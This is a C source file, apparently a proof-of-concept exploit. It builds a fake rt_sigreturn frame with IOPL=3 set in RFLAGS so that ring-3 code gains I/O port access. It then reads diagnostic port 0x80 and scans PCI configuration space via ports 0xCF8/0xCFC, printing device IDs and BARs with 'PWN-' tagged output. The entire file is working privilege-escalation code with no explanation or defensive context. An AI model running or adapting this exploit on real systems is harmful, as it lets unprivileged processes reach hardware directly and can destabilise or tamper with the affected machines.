// IOPL-3 injection through rt_sigreturn: ring3 gets I/O port privileges.
// Build: gcc -O2 -no-pie -o iopl iopl.c
#define _GNU_SOURCE
#include <stdint.h>
#include <string.h>

static inline long sc3(long n, long a, long b, long c) {
    long r;
    __asm__ __volatile__("syscall" : "=a"(r) : "a"(n), "D"(a), "S"(b), "d"(c) : "rcx", "r11", "memory");
    return r;
}
static void out(const char *s) { sc3(1, 1, (long)s, (long)strlen(s)); }

static inline uint8_t inb(uint16_t p) { uint8_t v; __asm__ __volatile__("inb %1,%0":"=a"(v):"Nd"(p)); return v; }
static inline uint16_t inw(uint16_t p) { uint16_t v; __asm__ __volatile__("inw %1,%0":"=a"(v):"Nd"(p)); return v; }
static inline uint32_t inl(uint16_t p) { uint32_t v; __asm__ __volatile__("inl %1,%0":"=a"(v):"Nd"(p)); return v; }
static inline void outb(uint16_t p, uint8_t v) { __asm__ __volatile__("outb %0,%1"::"a"(v),"Nd"(p)); }
static inline void outl(uint16_t p, uint32_t v) { __asm__ __volatile__("outl %0,%1"::"a"(v),"Nd"(p)); }

static unsigned char frame[1024] __attribute__((aligned(16)));
static unsigned char altstack[262144] __attribute__((aligned(16)));

static void hex64(char *b, uint64_t v) {
    static const char *h = "0123456789abcdef";
    b[0]='0'; b[1]='x';
    for (int i = 0; i < 16; i++) b[2+i] = h[(v >> (60 - 4*i)) & 0xf];
    b[18]=0;
}

__attribute__((noreturn)) static void resumed(void);

static void enter_sigreturn(void *uc) {
    __asm__ __volatile__(
        "movq %0, %%rsp\n\t"
        "movl $15, %%eax\n\t"
        "syscall\n\t"
        "ud2\n\t"
        : : "r"(uc) : "rax", "rcx", "r11", "memory");
    __builtin_unreachable();
}

__attribute__((noreturn)) static void resumed(void) {
    out("PWN-IOPL: resumed after rt_sigreturn\n");
    uint64_t fl;
    __asm__ __volatile__("pushfq; popq %0" : "=r"(fl));
    char line[128]; char hx[24];
    hex64(hx, fl);
    strcpy(line, "PWN-IOPL: RFLAGS="); strcat(line, hx); strcat(line, "\n");
    out(line);

    out("PWN-IO: probing port 0x80 (POST diagnostic)...\n");
    uint8_t post = inb(0x80);
    hex64(hx, post);
    strcpy(line, "PWN-IO: port 0x80 = "); strcat(line, hx); strcat(line, "\n");
    out(line);

    out("PWN-IO: scanning PCI config space bus0 via 0xCF8/0xCFC...\n");
    for (int dev = 0; dev < 32; dev++) {
        uint32_t id_addr = 0x80000000u | ((uint32_t)dev << 11);
        outl(0xCF8, id_addr);
        uint32_t v = inl(0xCFC);
        if (v == 0xffffffffu || v == 0) continue;
        uint32_t bar0 = 0, cmd = 0;
        outl(0xCF8, id_addr | 0x04); cmd = inl(0xCFC);
        outl(0xCF8, id_addr | 0x10); bar0 = inl(0xCFC);
        char msg[160];
        hex64(hx, v); strcpy(msg, "PWN-IO: pci dev="); 
        char d[8]; d[0]='0'+dev%10; d[1]=0; strcat(msg,d);
        strcat(msg, " id="); strcat(msg,hx);
        hex64(hx, cmd); strcat(msg, " cmd="); strcat(msg,hx);
        hex64(hx, bar0); strcat(msg, " bar0="); strcat(msg,hx);
        strcat(msg,"\n"); out(msg);
    }
    out("PWN-IOPL: done\n");
    sc3(60, 0, 0, 0); // exit
    for(;;);
}

int main(void) {
    out("PWN-IOPL: begin, forging sigreturn frame\n");
    memset(frame, 0, 304);
    uint64_t *mc = (uint64_t *)(frame + 40);
    mc[8]  = 0;   // rdi
    mc[9]  = 0;   // rsi
    mc[10] = 0;   // rbp
    mc[11] = 0;   // rbx
    mc[12] = 0;   // rdx
    mc[13] = 0;   // rax (fn return value after resume)
    mc[15] = (uint64_t)(altstack + sizeof(altstack) - 0x108); // rsp
    mc[16] = (uint64_t)resumed; // rip
    mc[17] = 0x3202;            // flags: IF | IOPL=3
    *(uint64_t *)(frame + 296) = 0; // uc_sigmask
    enter_sigreturn(frame);
    return 0;
}
